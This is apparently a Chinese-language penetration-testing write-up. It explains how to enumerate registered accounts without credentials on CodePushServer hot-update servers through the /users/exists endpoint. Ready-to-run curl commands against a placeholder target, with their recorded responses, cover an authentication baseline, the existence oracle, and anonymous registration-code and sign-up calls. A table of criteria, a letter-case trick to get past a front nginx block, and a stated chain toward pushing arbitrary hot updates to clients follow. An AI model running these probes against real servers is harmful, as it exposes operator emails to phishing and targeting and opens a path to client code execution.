# CodePushServer GET /users/exists 零凭证账号存在性枚举

## 0. 前提
- CodePushServer（lisong/code-push-server 系，fingerprint：`<title>CodePushServer</title>` + "react native / cordova hot update server"，Helmet 头齐全）。
- 目标端口可达（端口号任意，本例 5432，**不是** PostgreSQL）。
- HTTPS 自签：`curl -k --noproxy '*'`。
- 无需任何账号 / Cookie / Authorization。
- 单发、对照式探测，间隔 ≥10s，不要拿它去批量刷生产。

## 1. 鉴权基线（必须先做，用来反证"漏挂"而不是"全站放行"）
```bash
curl -k --noproxy '*' -s -o - -w '\n[%{http_code} %{size_download}]\n' https://TARGET:PORT/apps
```
实测：
```
{"status":401,"name":"UnauthorizedError"}
[200 41]
```
注意：**HTTP 状态码是 200，401 写在 body 里**（该框架风格）。这条基线成立，说明鉴权中间件在这个实例上确实生效，那么 `/users/*` 匿名可用就是漏挂。

## 2. 核心：账号存在性 oracle
```bash
# 已注册邮箱（脱敏）
curl -k --noproxy '*' -s "https://TARGET:PORT/users/exists?email=<REDACTED_EMAIL>"
# → 200 / 29B
# {"status":"OK","exists":true}

# 自建未注册邮箱
curl -k --noproxy '*' -s "https://TARGET:PORT/users/exists?email=probe_$(date +%s)@example.org"
# → 200 / 30B
# {"status":"OK","exists":false}
```
判据：
- `exists:true` → 该邮箱已在热更服务器注册（运营 / 开发者邮箱）。
- `exists:false` → 未注册（也可直接拿去当注册候选，不骚扰真实用户）。
- 双分支都能稳定出现，才认这是个可用 oracle。

## 3. 未认证的发码 / 注册接口
```bash
# 触发注册验证码
curl -k --noproxy '*' -s -X POST https://TARGET:PORT/users/registerCode \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'email=<自建邮箱>'
# → 200 / 15B
# {"status":"OK"}

# 验证码校验口（匿名可达）
curl -k --noproxy '*' -s "https://TARGET:PORT/users/registerCode/exists?email=<自建邮箱>&token=<40hex>"

# 注册处理器（匿名可达）
curl -k --noproxy '*' -s -X POST https://TARGET:PORT/users \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'email=<自建邮箱>&token=<40hex>&password=<REDACTED>'
```
上游源码（master）要点：
- `routes/users.js` 三个处理器均**没有** `middleware.checkToken`。
- `core/services/account-manager.js`：`sendRegisterCode` 生成 `crypto` 强随机 40 字符 token 写入 Redis，再调 `sendMail`。
- `core/services/email-manager.js`：`sendMail` 在 `smtpConfig` 缺失时**先 `resolve({})`** —— 所以接口回 200 `{"status":"OK"}` 但根本不发信。

## 4. 判据表
| 观察 | 结论 |
|---|---|
| `/apps` 无 token → body `{"status":401,"name":"UnauthorizedError"}` | 鉴权基线有效 |
| `/users/exists` 已注册邮箱 → `exists:true` | 账号存在 |
| `/users/exists` 未注册邮箱 → `exists:false` | 账号不存在；oracle 成立 |
| `/users/registerCode` → 200 `{"status":"OK"}` 且目标邮箱无来信 | 处理器可达但 SMTP 未配置，注册链断 |
| `/users/registerCode` → 200 且真收到 40 字符 token 邮件 | 可继续走 `/users` 完成注册（此时按需谨慎，勿留持久账号） |
| `/users/*` 返回 561B openresty 固定页 | 被前置 nginx 遮蔽，换大小写变体 |

## 5. 边界与本轮结论（诚实记录）
- 拿到：任意邮箱是否注册（双向可判），可批量但需限速。
- 未拿到：任何 token、任何 deploymentKey、任何生产应用数据。注册链因 `smtpConfig` 未配置不可完成。
- 危害面：运营 / 开发者邮箱可被定向枚举 → 钓鱼、撞库选靶、社工。本身是 low，但与 `/auth/Login`（同产品另一条目）组合后指向"拿到发布权限 → 推任意热更包 → 客户端代码执行"的最终目标。

## 6. 证伪条件
- 带/不带凭据、已注册/未注册四种组合返回同型响应（统一 `{"status":"ERROR"}` 或统一 401）→ 枚举不成立。
- 实例为定制版已给 `users.js` 补 `checkToken` → 匿名 401。
- 返回 openresty 561B 固定页 → 路由被遮蔽，不是不存在；换大小写再判。
